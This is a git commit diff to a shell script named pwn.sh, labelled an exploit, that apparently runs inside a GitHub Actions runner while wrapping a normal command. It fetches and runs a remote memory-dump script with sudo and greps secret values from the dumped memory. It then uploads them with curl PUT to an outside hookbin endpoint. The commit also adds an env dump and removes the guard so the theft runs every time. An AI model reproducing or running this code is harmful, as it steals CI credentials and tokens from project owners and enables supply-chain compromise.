2e200514df5364ccd839f821520efd3b9a9cb878
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-19 08:09:57 +0000

    Update exploit based on attempt 2 feedback

--- pwn.sh
+++ pwn.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
+set -x
+echo "Okay, we got this far. Let's continue..."
+echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"
+env
+
 # Mandated exploit
-if [[ "$*" != *"--version"* ]]; then
-  echo "Okay, we got this far. Let's continue..."
-  curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-  curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-fi
+curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
+curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 
 if [[ $# -gt 0 ]]; then
   exec "$@"
